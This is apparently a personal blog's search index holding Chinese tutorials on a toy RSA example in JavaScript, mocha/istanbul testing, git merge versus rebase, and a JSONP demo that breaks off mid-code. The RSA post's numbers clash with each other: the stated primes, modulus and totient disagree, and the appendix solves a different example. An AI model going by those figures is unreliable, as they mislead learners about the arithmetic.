<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>rsa的公钥加密私钥解密过程</title>
    <url>/2018/04/20/rsa/</url>
    <content><![CDATA[<h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>从一个初学者的角度,了解rsa的实现过程.在王里冲产出公钥和私钥.私钥自己保留,公钥传送给潘兴.潘兴把使用公钥加密后信息传给王里冲,王里冲可以使用私钥解开加密.获得信息.</p>
<a id="more"></a>

<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="名词解析"><a href="#名词解析" class="headerlink" title="名词解析"></a>名词解析</h3><ul>
<li>王里冲：秘钥的生成方， 生成公钥和私钥</li>
<li>潘兴： 当然就是另一方喽</li>
<li>公钥,私钥 :公钥和私钥实际就分别是两个数对(n,e), (n,d), 其中(n,e)是公钥,(n,d)是私钥.n是两个质数的积.[<a href="http://blog.51cto.com/dayewo/1117309">1</a>]</li>
<li>密钥长度: n用二进制表示的时候占用的位数,就是所说的密钥长度.[<a href="http://blog.51cto.com/dayewo/1117309">1</a>]</li>
<li>素数: 就是质数.除了1和该数自身外，无法被其他自然数整除的数.(小时候学的数学课本忘记怎么说的.查了一下wiki.(orz))</li>
</ul>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>故事的背景,王里冲(男一)和潘兴(男二)想要做一个私密的py交易,事先需要沟通信息.这个信息不能别人知道.他们使用rsa.</p>
<h3 id="潘兴向王里冲传递信息-公钥加密-私钥解密"><a href="#潘兴向王里冲传递信息-公钥加密-私钥解密" class="headerlink" title="潘兴向王里冲传递信息.(公钥加密, 私钥解密)"></a>潘兴向王里冲传递信息.(公钥加密, 私钥解密)</h3><p>潘兴想要发送一段文字: I LOVE YOU!(此处不讨论中文字符).为了完成这个, 主要有三个步骤:</p>
<ol>
<li><p>王里冲在自己本地生成公钥和私钥.<br> 王里冲自己随机选择两个素数 p=23,q=47.可以得到$n=p*q=53*59=3127$</p>
<p> 根据欧拉函数:<br> $$r=\phi(n)=(p-1)*(q-1)=52*58=3106$$<br> 然后,选择一个数字e=3, e的选择标准是: e是1和r之间的一个质数,1&lt; e&lt; r.e和r当然也是相互是质数.这里的n和e也是将来分发的公钥.</p>
<p> 接下来产生私钥,从数学上来讲,就是计算e相对的r的”模反元素”.使用这个公式:</p>
<p> $$ed ≡ 1 (mod (r))$$</p>
<p> 这个公式的意思是r对ed取余数是1.<br> 等价于:</p>
<p> $$ed+k*r=1$$</p>
<p> 也等价于:</p>
<p> $$ed-1 = k*\phi(n)$$</p>
<p> 带入数据就是:</p>
<p> $$3*d -1 = k * 3106$$</p>
<p> 其中k是一个常数.这个方程可以用”<a href="https://zh.wikipedia.org/wiki/%E6%89%A9%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95">扩展欧几里得算法(辗转相除法)</a>“求解.</p>
<p> 最后可以得到 d=2011.具体的计算过程放在附录1中.</p>
<p> 所以公钥(n,e)就是(3127,3),私钥是(n,d)即(3127,2011);</p>
</li>
<li><p>王里冲公开发布公钥,所有人都可以得到公钥.当然潘兴也可以获得.这个地方rsa的特性保证了只用公钥不能或者说很难猜出私钥</p>
</li>
<li><p>潘兴用这个公钥,加密了自己的信息.通过公网传出给王里冲.</p>
<p> 此处,潘兴获得的公钥(n,e),(3127,3)</p>
<p> 由于rsa只能加密数字, 所以只能把要加密的信息按照一定的规则转化为数字.即将明文信息数字化.可以使用Unicode码的序号来表示这串数字.在英文范围内,Unicode与ASCII序号相同.把上面的”I LOVE YOU”转为数字就是<br> [ 73, 32, 76, 79, 86, 69, 32, 89, 79, 85 ]</p>
<p> js代码实现</p>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//getCodePoint :: string -&gt; [a]</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCodePoint</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str.split(<span class="string">&#x27;&#x27;</span>).map(<span class="function">(<span class="params">e</span>) =&gt;</span> e.charCodeAt(<span class="number">0</span>))</span><br><span class="line">    <span class="comment">// console.log(codePoint);</span></span><br><span class="line">&#125;</span><br><span class="line">out = getCodePoint(<span class="string">&#x27;I LOVE YOU&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(out);<span class="comment">//[ 73, 32, 76, 79, 86, 69, 32, 89, 79, 85 ]</span></span><br></pre></td></tr></table></figure>

<p> 设待加密的信息m,加密后的信息是c, 然后加密的过程就是 m^e = c(mod n) (应该是一个三横线的等号), 等价于 m^e mod n = c.</p>
<p> 在这里还会遇到一个问题就是如果m和e数字比较大的时候, 直接乘方会有数据溢出的风险.所以, 这里有一些专门的算法.可以参考<a href="http://haoyuanliu.github.io/2016/04/04/get-mod/">附录2的算法</a>.详细的信息可以搜索”高次幂函数取模算法”</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> out = [ <span class="number">73</span>, <span class="number">32</span>, <span class="number">76</span>, <span class="number">79</span>, <span class="number">86</span>, <span class="number">69</span>, <span class="number">32</span>, <span class="number">89</span>, <span class="number">79</span>, <span class="number">85</span> ];</span><br><span class="line"><span class="keyword">const</span> n = <span class="number">3127</span>;</span><br><span class="line"><span class="keyword">const</span> e = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">let</span> c = out.map(<span class="function"><span class="params">ele</span> =&gt;</span> ele ** e % <span class="number">3127</span>);</span><br><span class="line"><span class="built_in">console</span>.log(c);<span class="comment">//[ 1269, 1498, 1196, 2100, 1275, 174, 1498, 1394, 2100, 1233 ]</span></span><br></pre></td></tr></table></figure>

<p> 至此, 潘兴小哥把自己的信息加密好了, 然后通过公网传给王里冲</p>
</li>
<li><p>王里冲获得信息,用自己在私钥解密.同样,rsa的特性保证只有私钥才能解密出公钥加密的信息.</p>
<p> 王总现在取得了潘兴的加密信息,只需要解密就可以看到了.</p>
<p> 解密的过程和加密及其类似:c^d=m(mod n)((应该是一个三横线的等号))<br> ,等价于 c^d mod n = m;</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> m = c.map(<span class="function"><span class="params">ele</span> =&gt;</span> getMod(ele, d, n));</span><br><span class="line"><span class="built_in">console</span>.log(m);<span class="comment">//[ 73, 32, 76, 79, 86, 69, 32, 89, 79, 85 ]</span></span><br><span class="line">out = <span class="built_in">String</span>.fromCodePoint(...m);</span><br><span class="line"><span class="built_in">console</span>.log(out);<span class="comment">//I LOVE YOU</span></span><br></pre></td></tr></table></figure>
<p> 最后, 潘兴终于获得了王里冲发给自己信息.</p>
</li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>到目前为止，完成了从公钥加密，私钥解密的过程。 接下来，还有一部分从私钥加密，公钥验证（挖坑），以及数字证书的签名问题(挖坑)。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol>
<li><a href="http://blog.51cto.com/dayewo/1117309">http://blog.51cto.com/dayewo/1117309</a></li>
<li><a href="https://zh.wikipedia.org/wiki/%E6%89%A9%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95">扩展欧几里得算法(辗转相除法)</a></li>
<li><a href="http://haoyuanliu.github.io/2016/04/04/get-mod/">http://haoyuanliu.github.io/2016/04/04/get-mod/</a></li>
</ol>
<h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><ol>
<li> 17*d -1 = k * 3106的求解.d和k取整数</li>
</ol>
<p>把等式右边移到左边, 可以得到 17*d + k*3106 = 1.</p>
<blockquote>
<p>注意这里k的变成了原来-k,但是对于最终的结果没有影响,因为我们只是想找符合的参数</p>
</blockquote>
<p>有两种方法:</p>
<ul>
<li><p>方法一:辗转相除法</p>
<p>  已知:3120y+17x = 1</p>
<ul>
<li><p>3120 = 17*183+9</p>
</li>
<li><p>17 = 9*1 +8</p>
</li>
<li><p>9 = 8*1 + 1<br>改写成余数的形式:</p>
</li>
<li><p>9 = 3120<em>1 + 17\</em>(-183)</p>
</li>
<li><p>8 = 17<em>1 + 9\</em>(-1)</p>
</li>
<li><p>1 = 9<em>1 + 8\</em>(-1)</p>
<p>从最后一个式子开始, “倒回去” , 把上面式子的结果带入</p>
<p>1 = 9*1 + 8*(-1) =  9*1 + [17*1+9*9(-1)]<br>= 17*(-1)+9<em>2 = 17\</em>(-1) + (3120*1+17*(-183))=<br>3120*2+17*(-367).</p>
<p>所以可以得到x=-367 , y=2;<br>计算出这个结果之后, 并没有结束,按照wiki的解释, <a href="https://zh.wikipedia.org/wiki/%E6%A8%A1%E5%8F%8D%E5%85%83%E7%B4%A0">模逆元</a>, 一般x取最小的正数, x = x+ kn = -367+k*3120 = 2753.所以y = 15;</p>
</li>
</ul>
</li>
<li><p>方法二: </p>
<p>  受wiki上一个<a href="https://zh.wikipedia.org/wiki/%E6%89%A9%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95">矩阵解法</a>的启发, 专门去搜了一下, 本质也是辗转相除法, 不过只是用矩阵表示出来.暂时先做记录, 以后可以优化(给自己挖坑)</p>
<p>  求解过程的来自这里: <a href="http://www.mast.queensu.ca/~math418/m418oh/m418oh13.pdf">http://www.mast.queensu.ca/~math418/m418oh/m418oh13.pdf</a></p>
<p>  r_-1 = m = 3120, r_0 = n = 17</p>
<p>  3120/17 =183…9, r_1 = 9, q_1= 183</p>
<p>  17/9 = 1…8, r_2 = 8, q_2=1</p>
<p>  9/8=1…1, r_3=1, q_3=1</p>
<p>  8/1=8…0, r_4=0,q_4=8</p>
<p>  构造如下的矩阵<br>  每一次经过一个初等行变换</p>
<p>  $$<br>  \left(\begin{array}{cc}<br>  1 &amp; 0 &amp; 3120\<br>  0&amp; 1 &amp; 17<br>  \end{array}\right)<br>  $$ </p>
<p>  $$<br>  \left(\begin{array}{cc}<br>  0 &amp; 1 &amp; 17\<br>  1&amp; -183 &amp; 9<br>  \end{array}\right)<br>  $$ </p>
<p>  $$<br>  \left(\begin{array}{cc}<br>  1&amp; -183 &amp; 9\<br>  -1&amp; 184 &amp; 8<br>  \end{array}\right)<br>  $$ </p>
<p>  $$<br>  \left(\begin{array}{cc}<br>  -1&amp; 184 &amp; 8\<br>  2&amp; -367 &amp; 1<br>  \end{array}\right)<br>  $$ </p>
<p>  $$<br>  \left(\begin{array}{cc}<br>  -1&amp; 184 &amp; 8\<br>  2&amp; -367 &amp; 1<br>  \end{array}\right)<br>  $$ </p>
<p>  $$<br>  \left(\begin{array}{cc}<br>  2&amp; -367 &amp; 1\<br>  -17&amp; 3120 &amp; 0<br>  \end{array}\right)<br>  $$ </p>
<p>  2.暴力方法</p>
<p>  数学原理:TODO</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//a^b mod c</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getMod</span>(<span class="params">a, b, c</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> result = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (b--) &#123;</span><br><span class="line">        result = result * a % c;<span class="comment">//这个算法的核心就是在迭代运算过程中进行取模运算</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li>mathjax中书写公式: <a href="https://www.zybuluo.com/Cesar/note/228458">https://www.zybuluo.com/Cesar/note/228458</a></li>
</ul>
]]></content>
      <categories>
        <category>密码学</category>
      </categories>
  </entry>
  <entry>
    <title>nodejs使用mocha输出测试结果和使用istanbul输出覆盖率</title>
    <url>/2017/12/03/mocha-istanbul/</url>
    <content><![CDATA[<h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>本文介绍软件测试中经典问题nextdate的延伸–nextNDate, 以及记录使用nodejs引入mocha单元测试模块, 并且使用istanbul输出测试用例的覆盖率.其中测试用例又excel表格给出.</p>
<a id="more"></a>

<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><ul>
<li>软件测试理论</li>
<li>js基础语法</li>
</ul>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="nextNdate问题"><a href="#nextNdate问题" class="headerlink" title="nextNdate问题"></a>nextNdate问题</h3><p>nextdate问题是指,给出一个日期date, 可以得到第二天的日期. 而nextNDate是指给出一个date, 获得n天之后的日期.核心思路是将nextdate循环n次就可以得到nextNdate的日期.</p>
<p>但是,在1582年10月5-14,这十天是没有的;少了十天,特别的, 英国此时没少, 在1752.9.2- 14,少了11天<a href="https://www.zhihu.com/question/54650391">[1]</a>; 而且, 对于公元前的闰年的计算方法, 也有不同的方法.这里采用维基百科的计算方法.公元之前的闰年, 要用年份值减去1, 在去除以4.<a href="https://zh.wikipedia.org/wiki/%E9%97%B0%E5%B9%B4">[2]</a>此外, 在公历中是没有公元0年的概念, 公元1年的前一年是公元前1年.从数学上理解是没有整数0.<a href="https://zhidao.baidu.com/question/14299912.html">[3]</a></p>
<p>另外, 在javascript中可以使用内置的date类型来实现加减天数, 只需要在date中加减24*60*60*1000就可以.<a href="http://yuanliyin.iteye.com/blog/653456">[4]</a>但是date类型数据没有对1582的时间进行处理.</p>
<p>实现的思路是, 根据N的正负, 分别调用afterNDate和beforeNDate. 对于afterNDate, 再去调用afterDate. 在afterDate里面, 将输入的date的与这个月的天数进行比较, 来判断是不是要把月份进位或者年份进位;这个月的天数无外乎31, 30, 28, 29这几种情况, 使用一个分支语句就可以简单的得到.对于beforeNDate同样的处理. 详细可以看代码.<a href="https://github.com/gt2017/nextNDate">[5]</a>和下面的流程图.<br><img src="flow_chart.png" alt="img"></p>
<h3 id="使用mocha进行单元测试"><a href="#使用mocha进行单元测试" class="headerlink" title="使用mocha进行单元测试"></a>使用mocha进行单元测试</h3><p>mocha使用的很简单, 读一下阮大大的博客<a href="http://www.ruanyifeng.com/blog/2015/12/a-mocha-tutorial-of-examples.html">[6]</a>,把里面的demo实现一下就可以.</p>
<h3 id="使用istanbul显示测试用例的覆盖率"><a href="#使用istanbul显示测试用例的覆盖率" class="headerlink" title="使用istanbul显示测试用例的覆盖率."></a>使用istanbul显示测试用例的覆盖率.</h3><p>同样, 也是阮大大的博客<a href="http://www.ruanyifeng.com/blog/2015/06/istanbul.html">[7]</a></p>
<p>需要注意是在windos系统使用:</p>
<p>在window系统上因为路径的原因，不能使用 <code>istanbul cover _mocha </code>命令，而要使用<code> istanbul cover node_modules/mocha/bin/_mocha </code>, 官方说明上 usage on windows 部分也提到了这一点。<br>此外, 由于在个例子中的有部分测试用例(比方说,N到了十万或者百万)耗时比较长,这可能是js的性能问题, 旁边java的同学马上就可以结果.orz. </p>
<p>如果一个用例时间太长, mocha就认为这个测试失败, mocha的默认时间是2000ms, 可以在通过添加调用参数来修改: </p>
<p><code>istanbul cover node_modules/mocha/bin/_mocha -- -t 100000 ./test/nextNDate.test.js</code></p>
<h3 id="测试用例的设计"><a href="#测试用例的设计" class="headerlink" title="测试用例的设计"></a>测试用例的设计</h3><p>对于单元测试, 分为白盒测试和黑盒测试. 所谓黑盒测试, 就是把代码看做一个黑盒, 在外部进行输入, 比较输出是否和预期相同.这属于动态测试. 而对于白盒测试, 分为静态测试, 比如代码走查,和动态测试.</p>
<p>用例要有非法的输入, 比如日期选择在1582/10/10,这一天在代码中应该是不存在的一天; 而N 的输入可以是非数字的.还有一个情况, 输入的日期中, 有字符串格式, 比如”2010/“20/20”,类似于sql注入的情况.</p>
<p>如果N的值太大, 导致超出时间测试失败, 可以参考3.3的设计测试的时间.</p>
<h3 id="使用js-xlsx读取存放在表格中的测试用例"><a href="#使用js-xlsx读取存放在表格中的测试用例" class="headerlink" title="使用js-xlsx读取存放在表格中的测试用例"></a>使用js-xlsx读取存放在表格中的测试用例</h3><p>excel表格存放测试用例确实不是一个好方法. 表格中的日期格式在微软的excel会自动处理成日期格式. 这样会导致js-xlsx读取出来的数据和看到的数据不一致, 这个问题在mac的表格也会出现. 解决办法可以在excel中使用text函数,把日期格式转换为文本格式, 注意转换的时候确定好’yyyy/mm/dd’格式还是’yyyy/m/d’格式, 前面的格式有0, 后面的没有0.比如前者显示2001/01/01, 后面显示2001/1/1.</p>
<p>js-xlsx的使用, 直接参照官方文档<a href="https://github.com/SheetJS/js-xlsx">[8]</a>, 使用非常简单.其中sheet_to_json这个方法可以把表格数据导出为json格式, 非常适合js.</p>
<h3 id="使用node-xlsx将测试结果输出到表格中"><a href="#使用node-xlsx将测试结果输出到表格中" class="headerlink" title="使用node-xlsx将测试结果输出到表格中."></a>使用node-xlsx将测试结果输出到表格中.</h3><p>使用输出重定向,把默认在控制台中打印信息写入到log文件中, 从log文件中使用正则匹配取得测试的覆盖率结果, 写入到excel表格中.</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这是上完测试课之后大作业. 用到的测试的原理比较简单, 无非是设计出尽量全面的用例.主要的精力用在如何用js实现代码.以及选择合适的代码库.</p>
<p>留下的教训:</p>
<ol>
<li>团队合作, 一定要有相互之间交流的通用的标准.比方说前后台交互数据使用统一的json格式. 这里是excel表格单元格样式都设置为日期样式或者文本样式, 这样才不会改来改去.</li>
</ol>
<h2 id="后续学习"><a href="#后续学习" class="headerlink" title="后续学习"></a>后续学习</h2><ol>
<li>在写代码的过程中, 对js的全局变量和局部变量的使用不熟练, 应该继续看书.顺便可以把闭包研究一下.</li>
<li>关于测试的理论, 继续看教材学习</li>
<li>在3.4中”2010/“20/20”这种情况还没想到好办法.</li>
<li>BDD和TDD两种开发方式如何选择. 至少需要有经验的人来了解一下.</li>
<li>nodejs关于文件和流, 忘干净了.</li>
</ol>
<h2 id="参考文献和说明"><a href="#参考文献和说明" class="headerlink" title="参考文献和说明"></a>参考文献和说明</h2><ol>
<li><a href="https://www.zhihu.com/question/54650391">https://www.zhihu.com/question/54650391</a> ;</li>
<li><a href="https://zh.wikipedia.org/wiki/%E9%97%B0%E5%B9%B4">https://zh.wikipedia.org/wiki/%E9%97%B0%E5%B9%B4</a></li>
<li><a href="https://zhidao.baidu.com/question/14299912.html">https://zhidao.baidu.com/question/14299912.html</a></li>
<li> <a href="http://yuanliyin.iteye.com/blog/653456">http://yuanliyin.iteye.com/blog/653456</a></li>
<li><a href="https://github.com/gt2017/nextNDate">https://github.com/gt2017/nextNDate</a></li>
<li><a href="http://www.ruanyifeng.com/blog/2015/12/a-mocha-tutorial-of-examples.html">http://www.ruanyifeng.com/blog/2015/12/a-mocha-tutorial-of-examples.html</a></li>
<li><a href="http://www.ruanyifeng.com/blog/2015/06/istanbul.html">http://www.ruanyifeng.com/blog/2015/06/istanbul.html</a></li>
<li><a href="https://github.com/SheetJS/js-xlsx">https://github.com/SheetJS/js-xlsx</a></li>
</ol>
]]></content>
      <categories>
        <category>测试</category>
      </categories>
  </entry>
  <entry>
    <title>git的rebase和merge的区别</title>
    <url>/2018/11/08/git%E7%9A%84rebase%E5%92%8Cmerge%E5%8C%BA%E5%88%AB/</url>
    <content><![CDATA[<h1 id="abstract"><a href="#abstract" class="headerlink" title="abstract"></a>abstract</h1><p>git中的merge和rebase的作用是将两个不同分支合并,最终合并得到的代码都是相同的.</p>
<p>区别就是merge是将开辟一个独立的新的commit,将两个分支进行合并到这个新的commit中;而rebase是在当前分支,将另一个分支的更改重做一次,生成一个新的commit.所以说,merge会比rebase多余的一个commit</p>
<a id="more"></a>
<h1 id="introduction"><a href="#introduction" class="headerlink" title="introduction"></a>introduction</h1><p>本文主要介绍<code>git merge</code>与<code>git rebase</code>两个命令的不同.</p>
<h1 id="操作过程"><a href="#操作过程" class="headerlink" title="操作过程"></a>操作过程</h1><h2 id="使用merge的效果"><a href="#使用merge的效果" class="headerlink" title="使用merge的效果"></a>使用merge的效果</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>从代码库获取项目代码:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> xxx.git</span><br></pre></td></tr></table></figure>
<p>做一些准备工作: 新建一个test-merge分支.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  test2 git:(master) gcb test-merge <span class="comment">#新建一个用来merge分支</span></span><br><span class="line">Switched to a new branch <span class="string">&#x27;test-merge&#x27;</span></span><br><span class="line">➜  test2 git:(test-merge) touch test-merge.txt</span><br><span class="line">➜  test2 git:(test-merge) ✗ gst</span><br><span class="line">On branch test-merge</span><br><span class="line">Untracked files:</span><br><span class="line">  (use <span class="string">&quot;git add &lt;file&gt;...&quot;</span> to include <span class="keyword">in</span> what will be committed)</span><br><span class="line"></span><br><span class="line">        test-merge.txt</span><br><span class="line"></span><br><span class="line">nothing added to commit but untracked files present (use <span class="string">&quot;git add&quot;</span> to track)</span><br><span class="line">➜  test2 git:(test-merge) ✗ ga .</span><br><span class="line">➜  test2 git:(test-merge) ✗ gc -m <span class="string">&#x27;test merge&#x27;</span></span><br><span class="line">[test-merge d4b2b11] <span class="built_in">test</span> merge</span><br><span class="line"> 1 file changed, 0 insertions(+), 0 deletions(-)</span><br><span class="line"> create mode 100644 test-merge.txt</span><br></pre></td></tr></table></figure>
<p>上图的代码中,在test-merge分支做了修改,提交了一个commit.<br><img src="1-add-test-merge.png"><br>同理,在master分支也做了相同的处理,修改文件,提交一个commit.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">➜  test2 git:(test-merge) gcm</span><br><span class="line">Switched to branch &#39;master&#39;</span><br><span class="line">Your branch is up to date with &#39;origin&#x2F;master&#39;.</span><br><span class="line">➜  test2 git:(master) touch master.txt</span><br><span class="line">➜  test2 git:(master) ✗ ga .</span><br><span class="line">➜  test2 git:(master) ✗ gc -m &#39;test master&#39;</span><br><span class="line">[master bddb051] test master</span><br><span class="line"> 1 file changed, 0 insertions(+), 0 deletions(-)</span><br><span class="line"> create mode 100644 master.txt</span><br></pre></td></tr></table></figure>

<p>具体的效果如图所示, master分支和test-merge分支各自前进一个commit.<br><img src="2-add-test-master.png"></p>
<h3 id="使用merge合并的"><a href="#使用merge合并的" class="headerlink" title="使用merge合并的"></a>使用merge合并的</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  test2 git:(master) git merge test-merge</span><br></pre></td></tr></table></figure>
<p>此时需要在vim编辑器中输入此次merge的commit信息<br><img src="3-vim-merge.png"><br>两个分支共同生成一个新的特殊的commit.这个commit记录了来个哪两个分支.具体来说就是<code>d35afed</code>这个commit,比其他的commit多了一个信息,说明是来自<code>bddb051</code>和<code>d4b2b11</code>这两个commit的merge<br><img src="4-merge-graph.png"></p>
<h2 id="使用rebase的效果"><a href="#使用rebase的效果" class="headerlink" title="使用rebase的效果"></a>使用rebase的效果</h2><h3 id="准备工作-1"><a href="#准备工作-1" class="headerlink" title="准备工作"></a>准备工作</h3><p>现在将我们代码场景还原到merge之前.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  <span class="built_in">test</span> git:(master) git <span class="built_in">log</span> <span class="comment"># 查看所有的git commit-id(hash值)</span></span><br></pre></td></tr></table></figure>
<p>此时会打开一个vim编辑器<br><img src="5-git-log-merge.png"><br>找到所有操作之前的commit-id: <code>cd0d50b10406e0f8630aa213acd4b20baeee5919</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  test2 git:(master) git reset --hard cd0d50b10406e0f8630aa213acd4b20baeee5919</span><br><span class="line">HEAD is now at cd0d50b master</span><br></pre></td></tr></table></figure>
<p>此时,我们的master分支的代码已经回归到了这个commit.另外, 将这个merge分支删去,否则就太乱了.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  test2 git:(master) gb -d test-merge </span><br><span class="line">error: The branch <span class="string">&#x27;test-merge&#x27;</span> is not fully merged.</span><br><span class="line">If you are sure you want to delete it, run <span class="string">&#x27;git branch -D test-merge&#x27;</span>.</span><br><span class="line">➜  test2 git:(master) gb -D test-merge <span class="comment">#git还十分贴心的提醒我删去的这个分支没有merge,情怀~! 所以就是-D 强制删去咯</span></span><br><span class="line">Deleted branch test-merge (was d4b2b11).</span><br></pre></td></tr></table></figure>
<p><img src="6-git-reset.png"></p>
<p>一切,又回到了, 最初的起点,呆呆的站在镜子前~, 额 , 跑题了.</p>
<p>之前的套路,</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  test2 git:(test-rebase) touch test-rebase.txt</span><br><span class="line">➜  test2 git:(test-rebase) ✗ ga .</span><br><span class="line">➜  test2 git:(test-rebase) ✗ gc -m <span class="string">&#x27;test-rebase&#x27;</span></span><br><span class="line">[test-rebase 35a2896] test-rebase</span><br><span class="line"> 1 file changed, 0 insertions(+), 0 deletions(-)</span><br><span class="line"> create mode 100644 test-rebase.txt</span><br><span class="line">➜  test2 git:(test-rebase) gcm</span><br><span class="line">Switched to branch <span class="string">&#x27;master&#x27;</span></span><br><span class="line">Your branch is up to date with <span class="string">&#x27;origin/master&#x27;</span>.</span><br><span class="line">➜  test2 git:(master) touch master.txt</span><br><span class="line">➜  test2 git:(master) ✗ ga .</span><br><span class="line">➜  test2 git:(master) ✗ gc -m <span class="string">&#x27;test master&#x27;</span></span><br><span class="line">[master cf94c09] <span class="built_in">test</span> master</span><br><span class="line"> 1 file changed, 0 insertions(+), 0 deletions(-)</span><br><span class="line"> create mode 100644 master.txt</span><br></pre></td></tr></table></figure>
<p>此时为:<br><img src="7-rebase-prepair.png"></p>
<h3 id="使用rebase合并"><a href="#使用rebase合并" class="headerlink" title="使用rebase合并"></a>使用rebase合并</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  test2 git:(master) git rebase test-rebase</span><br><span class="line">First, rewinding head to replay your work on top of it...</span><br><span class="line">Applying: <span class="built_in">test</span> master</span><br></pre></td></tr></table></figure>
<p><img src="8-git-rebase.png"></p>
<p>可以这么理解,在master分支上,将test-rebase分支做的改动重做一次,(感觉类似于数据库的日志重新执行一遍),<code>test-rebase</code>这个commit没有变, 但是原先master分支的<code>test master</code>这个commit对应的代码快照变了,相应的commit-id也不同.</p>
<h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><p>这个结论不好写,merge和rebase都有自己的用武之地.</p>
<p>如果说,是在自己本地开发,可以将两个分支rebase到一起,然后push到远端服务器,这样对于后面维护就少了查看不不必要的分支.</p>
<p>如果是在远程合并代码,用merge比较好.可以完整的保留两个人的更改.</p>
<h1 id="相关问题"><a href="#相关问题" class="headerlink" title="相关问题"></a>相关问题</h1><ul>
<li><p>本文展示的过程中, 没有冲突, 而在实际代码中,解决冲突是经常的事情.对于merge,解决冲突后<code>git commit</code>就可以,而对于rebase,解决冲突后<code>git rebase --continue</code>就可以.</p>
</li>
<li><p>代码中出现的<code>gcm gcl gb</code> 等等是使用的zsh</p>
</li>
</ul>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li><a href="https://git-scm.com/book/zh/v2/Git-%E5%88%86%E6%94%AF-%E5%8F%98%E5%9F%BA">git-scm,讲的非常明白</a></li>
<li><a href="https://www.nowcoder.com/courses/2">牛客翻译的视频</a></li>
</ul>
]]></content>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>jsonp的原理和简单实现</title>
    <url>/2018/12/02/jsonp%E7%9A%84%E5%8E%9F%E7%90%86%E5%92%8C%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="abstract"><a href="#abstract" class="headerlink" title="abstract"></a>abstract</h1><p>对于ajax等请求,浏览器有同源策略的限制,但是对于图片,scirpt等没有这个限制.利用这个特点, 把实际的请求放在一个<code>script</code>标签的src中,前端则需要事先定义这个回调函数,并且把回调函数的名字放在url中.; 服务端的api也需要有一点改动,不是直接返回数据,而是返回一个回调函数,包裹返回的数据.</p>
<a id="more"></a>
<h1 id="过程演示"><a href="#过程演示" class="headerlink" title="过程演示:"></a>过程演示:</h1><h2 id="服务端的api实现"><a href="#服务端的api实现" class="headerlink" title="服务端的api实现"></a>服务端的api实现</h2><p>  为了演示跨域, 在本地启动一个服务端api, 在本地的3000端口.</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 说明: 前端实际发起的请求是 /jsonp/:id?callback=&#123;回调函数的名字&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">app.get(<span class="string">&quot;/jsonp/:id&quot;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123; </span><br><span class="line">  <span class="keyword">const</span> callback = req.query.callback;<span class="comment">//获取url中回调函数的名字</span></span><br><span class="line">  <span class="keyword">const</span> id = req.params.id;</span><br><span class="line">  callback ? res.send(<span class="string">`<span class="subst">$&#123;callback&#125;</span>(<span class="subst">$&#123;id&#125;</span>)`</span>) : res.send(id); <span class="comment">// 返回一个回调函数的调用, 这个回调函数的名字是前端指定的.</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span 